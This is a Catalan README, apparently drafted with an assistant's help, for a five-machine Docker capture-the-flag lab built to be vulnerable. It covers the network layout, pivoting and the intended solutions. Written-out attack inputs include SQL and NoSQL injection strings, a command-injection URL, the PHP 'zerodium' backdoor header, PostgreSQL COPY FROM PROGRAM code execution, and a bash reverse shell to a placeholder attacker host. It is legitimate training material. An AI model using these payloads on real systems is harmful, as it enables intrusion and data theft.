# OOPS-CTF — Laboratori Capture The Flag (5 màquines Docker)

> 📖 **Nova a aquí?** Comença per **`GUIA.md`** (guia de jugador: posada en
> marxa + objectius + pistes escalonades). Per als atacs de capa 2 (DHCP/DNS/ARP
> reals) tens el laboratori **`macvlan/`** amb la seva pròpia guia. La solució
> completa pas a pas és a **`SOLUCIONARI.md`** (spoilers!).

> **⚠️ Ús exclusiu en laboratori aïllat i propi.** Aquestes màquines són
> *intencionadament vulnerables*. No les exposis mai a internet ni a la teva
> xarxa domèstica. Publicar ports al host és només per depurar; en "mode CTF"
> ataca-les des d'una Kali/Parrot connectada a `dmz_net`.

---

## 0. Requisits i posada en marxa

- Docker + Docker Compose v2.
- Arquitectura **amd64** recomanada (MongoDB i alguns repos ho assumeixen).
- Aquest laboratori **no s'ha pogut construir/provar** al meu entorn (sense xarxa):
  és un **esquelet funcional i coherent** pensat per construir-se a casa teva.
  Espera fer petits ajustos (versions de paquets, sockets de PHP, `mongosh`).

### Estructura (una carpeta per màquina, cada una amb el seu compose)

```
oops-ctf/
├── setup-networks.sh     # crea les 2 xarxes compartides (executar UN COP)
├── Makefile              # conveniència: up / down / build de totes
├── oops1/ ├─ Dockerfile  └─ docker-compose.yml   (+ www/, sql/, ...)
├── oops2/ ├─ Dockerfile  └─ docker-compose.yml
├── oops3/ ├─ Dockerfile  └─ docker-compose.yml
├── oops4/ ├─ Dockerfile  └─ docker-compose.yml
└── oops5/ ├─ Dockerfile  └─ docker-compose.yml
```

Les xarxes `oops_dmz` i `oops_internal` són **externes i compartides**: es creen
un cop i cada màquina s'hi enganxa pel seu compte. Per això OOPS_4 pot estar a
les dues i OOPS_5 queda aïllada tot i ser contenidors independents.

### Aixecar-ho tot

```bash
cd oops-ctf
bash setup-networks.sh          # 1) crea les xarxes (un sol cop)
make up                         # 2) build + up de totes  (o veure sota)
```

### Aixecar / tombar una màquina sola

```bash
bash setup-networks.sh          # si encara no ho has fet
cd oops1
docker compose up -d --build    # només OOPS_1
docker compose down             # tombar-la
```

> Comandes `make`: `make net` (xarxes), `make up`, `make build`, `make down`,
> `make ps`, `make clean` (tomba-ho tot i esborra les xarxes).

Per atacar "de veritat", posa la teva Kali a la xarxa DMZ:
```bash
docker run -it --rm --network oops-ctf_dmz_net kalilinux/kali-rolling bash
# dins: apt update && apt install -y nmap dnsutils netexec hydra hashcat john gobuster
```

---

## 1. Topologia i moviment lateral

```
attacker (Kali)  →  dmz_net 10.10.10.0/24  →  [oops4 dual-homed]  →  internal_net 10.10.20.0/24
                    oops1 .11                                        oops2 .12
                    oops3 .13                                        oops5 .15  (crown jewel)
                    oops4 .14  ───────────────────────────────────  oops4 .14
```

- `internal_net` està marcada com **`internal`**: no té sortida i **no és
  abastable directament des de la DMZ**. L'única porta és **OOPS_4**.
- **oops2 i oops5 només s'ataquen fent pivot per oops4.**

Exemple de pivot un cop tens foothold SSH a oops4 (`netadmin:autumn`):
```bash
# Túnel SOCKS des de la teva Kali a través d'oops4
ssh -D 1080 netadmin@10.10.10.14
# i encamina eines amb proxychains cap a 10.10.20.0/24
# (o SSH -L 2225:10.10.20.15:22 netadmin@10.10.10.14 per arribar a oops5)
```

---

## 2. Disseny per màquina (repte → solució prevista → flags)

### 🟥 OOPS_1 — Web (nginx+PHP+MySQL) · `10.10.10.11`
**Vectors d'entrada (n'hi ha prou amb un):**
1. **SQLi** a `/login.php`: `username = admin' -- -`
2. **Command injection** a `/tools.php?host=127.0.0.1; id`
3. **Backdoor estil PHP 8.1.0-dev** (reproduït): capçalera
   `User-Agentt: zerodiumsystem('id')` a `GET /`.

**Contrasenyes caducades amb patró** (`<Estació><Any>!`) → genera diccionari
i prova amb **hydra** (veure `oops1/scripts/gen_wordlist_hint.md`).

**Privesc (enigma):** `/internal/patternmatch.php` conté un missatge en **ASCII
decimal**. En descodificar-lo (defineix el *pattern matching* de Java) revela el
secret del compte local:
```bash
curl -s http://10.10.10.11/internal/patternmatch.php   # mira el codi font via LFI/RCE
python3 -c "print(''.join(chr(int(x)) for x in '73 110 32 ...'.split()))"
# → secret: Cr4ckM3_L4b#2024  →  su oopsuser
```
SSH `webadmin` té contrasenya **forta** a posta (no és el camí).

- `FLAG{oops1_web_user_foothold}` (a `oopsuser`)
- `FLAG{oops1_root_pattern_matching_solved}` (a `/root`, després de su + escalada)

### 🟥 OOPS_2 — PostgreSQL (intranet) · `10.10.20.12` *(via pivot)*
1. **RCE via `COPY ... FROM PROGRAM`** (CVE-2019-9193). El rol `intranet`
   (`intranet:intranet`) és superuser:
   ```sql
   CREATE TABLE x(o text); COPY x FROM PROGRAM 'id'; SELECT * FROM x;
   ```
2. Llegeix `/opt/secure/aes.key` via RCE i **desxifra** `secure_data.ciphertext`:
   ```bash
   echo '<blob>' | openssl enc -d -aes-256-cbc -pbkdf2 -a -pass pass:S3cr3t_AES_K3y_do_not_share
   ```
3. **Cruixir hashos** `sha256(salt.password)` de la taula `credentials` (mode
   personalitzat a hashcat, o valida amb un petit script Python).
4. La **clau SSH privada** de `dbuser` és a la taula `ssh_keys` → SSH sense
   contrasenya.
5. **Privesc sudo:** `dbuser` pot `sudo /opt/backup.sh`, que fa `source
   /home/dbuser/backup.conf` (escrivible):
   ```bash
   echo 'bash -i >& /dev/tcp/ATACANT/4444 0>&1' > ~/backup.conf   # o: echo "chmod +s /bin/bash"
   sudo /opt/backup.sh
   ```

- `FLAG{oops2_user_foothold_via_pg}`, `FLAG{oops2_decrypted_customer_data}`,
  `FLAG{oops2_root_via_sudo_backup}`

### 🟥 OOPS_3 — Web (:8080) + MongoDB · `10.10.10.13`
1. **gobuster** descobreix `/backup` i `/api/debug`:
   ```bash
   gobuster dir -u http://10.10.10.13:8080 -w /usr/share/wordlists/dirb/common.txt
   ```
2. **MongoDB sense auth** (27017) o `/api/debug` → llegeix col·leccions.
3. **NoSQL injection** al login (JSON): `{"username":"admin","password":{"$ne":null}}`.
4. `/backup` filtra `DATA_ENC_KEY=Sup3rMongoKey_2024` → **desxifra** `secure_docs`.
5. **Privesc:** el hash de root (`$5$R00tS4lt$...`, sha256crypt) és a
   `system_secrets` → **hashcat -m 7400** (password real: `dragon`).

- `FLAG{oops3_user_via_mongo_nosqli}`, `FLAG{oops3_decrypted_secure_doc}`,
  `FLAG{oops3_root_cracked_sha256crypt}`

### 🟧 OOPS_4 — DNS/DHCP · `10.10.10.14 / 10.10.20.14` (passarel·la)
1. **AXFR obert** revela tota la xarxa interna:
   ```bash
   dig axfr oops.lab @10.10.10.14        # veus oops5.oops.lab → 10.10.20.15 i TXTs
   ```
2. **Foothold SSH** `netadmin:autumn` (cruixible amb hydra).
3. A `/opt/net/inventory.txt` hi ha la **credencial reutilitzable** d'OOPS_5.
4. **DHCP** (dnsmasq) a la interna: escenari per practicar captura amb Wireshark
   i *rogue DNS* (llegeix l'avís de sota).

- `FLAG{oops4_pivot_gateway}`

### 🟩 OOPS_5 — Crown Jewel · `10.10.20.15` *(només via pivot)*
- Descobreixes que existeix per l'AXFR d'OOPS_4; hi arribes **pivotant** per oops4;
  hi entres amb la credencial reutilitzada (`siteadmin:L4t3r4l_M0v3_2024`) →
  **moviment lateral**; `sudo` NOPASSWD → root ("domini compromès").

- `FLAG{oops5_lateral_movement_success}`, `FLAG{oops5_CROWN_JEWEL_full_compromise}`

---

## 3. ⚠️ Avís honest sobre DHCP/DNS a Docker

Els atacs **DHCP starvation / spoofing** i **DNS cache poisoning "de veritat"**
són **de capa 2** i necessiten accés a la trama Ethernet. En un `bridge` de
Docker:
- La **IPAM la gestiona Docker**, no hi ha un DHCP "legítim" a envenenar.
- El **DNS l'intercepta Docker** (127.0.0.11) per als contenidors.

Per tant, tal com està, OOPS_4 et permet practicar **DNS realista** (AXFR,
enumeració de subdominis, resolver forçat) però el **DHCP és més "demostratiu"
que atacable**. Dues sortides:

1. **macvlan/ipvlan** (parcial): crea una xarxa macvlan i connecta-hi oops4 i un
   "client"; així el DHCP de dnsmasq sí que reparteix leases i pots capturar/rogue.
   Requereix `--privileged` o `NET_ADMIN` i suport del kernel/host.
2. **VMs (recomanat per L2):** mou OOPS_4/OOPS_5 a VirtualBox en una *Internal
   Network* sense servidor DHCP propi. Allà el DHCP starvation, el rogue DHCP i
   l'ARP/DNS spoofing funcionen com al món real (Responder, mitm6, `dhcpstarv`,
   `ettercap`). Aquesta és la via fidel a un entorn AD real.

Si vols, et preparo la variant **macvlan** del `compose` o els passos per portar
aquestes dues màquines a VirtualBox amb DHCP atacable.

---

## 4. Què és complet i què és esquelet

- **Complet i coherent:** compose + xarxes, vulns d'OOPS_1/2/3 (codi real),
  AXFR d'OOPS_4, i el flux de pivot cap a OOPS_5.
- **A afinar al teu host:** socket exacte de `php-fpm` (Debian 12 = `php8.2`),
  presència de `mongosh`, i l'ajust macvlan si vols DHCP atacable.
- **Idea de disseny:** cada màquina té 1 flag d'usuari + 1 de root, i OOPS_5
  tanca la cadena (enum→accés→escalada→lateral→compromís total), mapejable a
  MITRE ATT&CK igual que a la teva guia.

Digues per on vols que aprofundeixi: (a) variant macvlan per DHCP real,
(b) migració d'OOPS_4/5 a VirtualBox, o (c) afegir un writeup complet pas a pas
de cada màquina.
